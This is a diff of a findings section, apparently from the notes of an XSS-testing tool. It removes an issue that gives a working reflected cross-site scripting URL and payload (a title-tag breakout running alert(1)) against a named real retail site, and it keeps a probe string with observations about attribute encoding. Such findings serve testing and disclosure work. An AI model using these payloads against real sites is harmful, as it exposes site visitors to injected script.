@@ -88,22 +88,6 @@ if __name__ == "__main__":
 ==>>    FINDINGS:
 
 ISSUE NO. 1:
-
-1. https://www.burpee.com/
-2. Alert(1) link:
- https://www.burpee.com/search?q=%3C%2Ftitle%3E%3CScRipT%3Ealert%281%29%3C%2FsCRipT%3E&simplesearch=Go
-
-3. Encoding Summary for this URL is as follows:
-Special Chars = Context Presence   "     '      <       (
-HTML Encoding=   True              True  True   True    True
-Attack Payloads:  []
-
-4. you can see no attack payloads are selected as per depicted by our methodology. 
-5. But you see this webpage can be XSSed using point no.2
-6. Payloads = %3C%2Ftitle%3E%3CScRipT%3Ealert%281%29%3C%2FsCRipT%3E
-
-
-ISSUE NO. 2:
 1. https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
 2. URL Context: Encoding is present and also absent for different attributes of the TAG e.g: <a> 
  <a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">
